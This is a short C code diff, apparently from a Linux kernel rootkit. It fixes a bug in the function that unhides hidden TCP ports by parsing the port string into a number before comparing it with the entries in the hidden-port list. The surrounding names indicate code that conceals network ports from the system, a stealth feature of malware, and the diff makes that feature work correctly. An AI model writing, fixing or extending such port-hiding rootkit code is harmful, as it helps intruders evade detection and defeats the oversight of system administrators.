@@ -444,10 +444,12 @@ void hide_tcp4_port(const char *port)
 void unhide_tcp4_port(const char *port)
 {
     struct hidden_port *hp;
+	
+    unsigned long port_num = simple_strtoul(port, NULL, 10);
 
     list_for_each_entry ( hp, &hidden_tcp4_ports, list )
     {
-        if ( port == hp->port )
+        if ( port_num == hp->port )
         {
             list_del(&hp->list);
             kfree(hp);
